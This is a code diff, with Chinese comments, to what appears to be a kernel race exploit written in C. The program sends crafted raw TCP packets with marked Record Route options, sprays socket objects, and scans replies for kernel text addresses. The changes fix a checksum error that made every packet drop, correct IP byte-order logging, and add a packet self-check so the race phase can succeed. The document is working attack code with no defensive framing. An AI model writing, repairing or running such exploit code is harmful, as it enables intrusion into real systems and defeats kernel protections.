@@ -97,13 +97,26 @@ static pthread_mutex_t g_ring_lock = PTHREAD_MUTEX_INITIALIZER;
 static volatile int g_running = 1;
 static volatile unsigned long g_tx, g_rx, g_synack, g_hit, g_clear, g_none;
 
-static uint16_t csum(const void *data, size_t len, uint32_t init) {
+/* 校验和要分两步：先把各段原样求和，最后统一取反一次。
+ *
+ * 反码运算里 ~x ≡ -x（模 0xFFFF），所以“先取反再当 init 传进去”算出来的
+ * 是 ph_sum - tcp_sum，而不是 -(ph_sum + tcp_sum) —— 每个包都会被内核
+ * 当成校验和错误静默丢弃。之前 synack=0 就是这个原因。 */
+static uint32_t csum_raw(const void *data, size_t len) {
     const uint16_t *p = data;
-    uint32_t s = init;
+    uint32_t s = 0;
     while (len > 1) { s += *p++; len -= 2; }
     if (len) s += *(const uint8_t *)p;
+    return s;
+}
+
+static uint16_t csum_fold(uint32_t s) {
     while (s >> 16) s = (s & 0xffff) + (s >> 16);
     return (uint16_t)~s;
+}
+
+static uint16_t csum(const void *data, size_t len) {
+    return csum_fold(csum_raw(data, len));
 }
 
 /* 40 字节 RR 选项：len=39 + 末尾 NOP；第 3 字节起是 4 字节标记 */
@@ -133,7 +146,7 @@ static size_t build_pkt(uint8_t *buf, uint16_t sport, uint32_t seq, uint32_t ack
     *(uint32_t *)(buf + 12) = g_src;
     *(uint32_t *)(buf + 16) = g_dst;
     memcpy(buf + 20, opts, OPT_MAXLEN);
-    *(uint16_t *)(buf + 10) = csum(buf, 20 + OPT_MAXLEN, 0);
+    *(uint16_t *)(buf + 10) = csum(buf, 20 + OPT_MAXLEN);
 
     uint8_t *tcp = buf + ihl;
     *(uint16_t *)(tcp + 0) = htons(sport);
@@ -143,15 +156,15 @@ static size_t build_pkt(uint8_t *buf, uint16_t sport, uint32_t seq, uint32_t ack
     tcp[12] = 5 << 4;
     tcp[13] = flags;
     *(uint16_t *)(tcp + 14) = htons(0xffff);
-    uint32_t pseudo = 0;
     uint8_t ph[12];
     memcpy(ph, &g_src, 4);
     memcpy(ph + 4, &g_dst, 4);
     ph[8] = 0;
     ph[9] = 6;
     *(uint16_t *)(ph + 10) = htons(20);
-    pseudo = csum(ph, 12, 0);
-    *(uint16_t *)(tcp + 16) = csum(tcp, 20, pseudo);
+    /* 伪头与 TCP 段各求原和，加起来只取反一次。 */
+    uint32_t sum = csum_raw(ph, 12) + csum_raw(tcp, 20);
+    *(uint16_t *)(tcp + 16) = csum_fold(sum);
     return total;
 }
 
@@ -365,8 +378,8 @@ static int listen_open(uint16_t port) {
 
     if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
         say("[listen] bind %u.%u.%u.%u:%u 失败 errno=%d（地址还没配上？）",
-            (g_dst >> 24) & 0xff, (g_dst >> 16) & 0xff, (g_dst >> 8) & 0xff,
-            g_dst & 0xff, port, errno);
+            g_dst & 0xff, (g_dst >> 8) & 0xff, (g_dst >> 16) & 0xff,
+            (g_dst >> 24) & 0xff, port, errno);
         close(fd);
         return -1;
     }
@@ -378,8 +391,9 @@ static int listen_open(uint16_t port) {
     /* 非阻塞：accept 只在空闲时排空队列，不能把主流程卡住。 */
     int flags = fcntl(fd, F_GETFL, 0);
     fcntl(fd, F_SETFL, flags | O_NONBLOCK);
+    /* g_dst 是 inet_addr 的返回值，已经是网络序；按字节顺序打印才正确。 */
     say("[listen] 已在 %u.%u.%u.%u:%u 监听",
-        (g_dst >> 24) & 0xff, (g_dst >> 16) & 0xff, (g_dst >> 8) & 0xff, g_dst & 0xff, port);
+        g_dst & 0xff, (g_dst >> 8) & 0xff, (g_dst >> 16) & 0xff, (g_dst >> 24) & 0xff, port);
     return fd;
 }
 
@@ -513,7 +527,37 @@ static void fire_pair(uint16_t sport, uint32_t isn, uint32_t peer_seq) {
 
 /* ------------------------------------------------------------ 主流程 */
 
+/* 自检：把构造出来的 SYN 用独立算法重新验证一遍。
+ *
+ * 校验和错了内核会静默丢弃，表现是 tx 涨但 synack 一直是 0，很难定位。
+ * 所以在 probe 阶段先验一次，错了立刻报出来。 */
+static int selfcheck_pkt(void) {
+    uint8_t pkt[128];
+    size_t total = build_pkt(pkt, 12345, 0x11223344, 0, 0x02);
+    size_t ihl = (pkt[0] & 0x0f) * 4;
+
+    /* IP 头校验和：把整个头再求一次，结果应为 0。 */
+    if (csum_fold(csum_raw(pkt, 20 + OPT_MAXLEN)) != 0) {
+        say("[selfcheck] IP 头校验和错误");
+        return 1;
+    }
+    /* TCP：伪头 + 段一起求，结果应为 0。 */
+    uint8_t ph[12];
+    memcpy(ph, pkt + 12, 8);
+    ph[8] = 0;
+    ph[9] = 6;
+    *(uint16_t *)(ph + 10) = htons((uint16_t)(total - ihl));
+    uint32_t sum = csum_raw(ph, 12) + csum_raw(pkt + ihl, total - ihl);
+    if (csum_fold(sum) != 0) {
+        say("[selfcheck] TCP 校验和错误（内核会静默丢弃这些包）");
+        return 1;
+    }
+    say("[selfcheck] 报文校验和正确（IP 头 + TCP 伪头）");
+    return 0;
+}
+
 static int phase_probe(void) {
+    if (selfcheck_pkt() != 0) return 1;
     for (int i = 0; i < 5; i++) {
         uint16_t sport;
         uint32_t isn;
@@ -586,6 +630,8 @@ static int find_text_candidates(const struct synack *s, uint64_t *out, int max) 
  * 而下一轮 syn_round 会换一个随机端口。所以命中必须在 fire_pair 之后
  * 用 drain_for 当场收走，等下一轮再看就永远看不到。 */
 static int phase_race(struct hit_ctx *hit) {
+    if (selfcheck_pkt() != 0) return 1;
+
     int found = 0;
     int blind = 0;
     say("开始竞态：喷淋 %d 个对象/轮，最多 %d 轮", SPRAY_SOCKS, g_rounds);
@@ -601,8 +647,8 @@ static int phase_race(struct hit_ctx *hit) {
             if (++blind >= 200) {
                 say("[!] 连续 %d 轮收不到任何 SYNACK，判定通道不通", blind);
                 say("[!] 检查：端口 %u 是否在 %u.%u.%u.%u 上 listen、tun 是否收到包",
-                    g_port, (g_dst >> 24) & 0xff, (g_dst >> 16) & 0xff,
-                    (g_dst >> 8) & 0xff, g_dst & 0xff);
+                    g_port, g_dst & 0xff, (g_dst >> 8) & 0xff,
+                    (g_dst >> 16) & 0xff, (g_dst >> 24) & 0xff);
                 spray_stop();
                 return 1;
             }
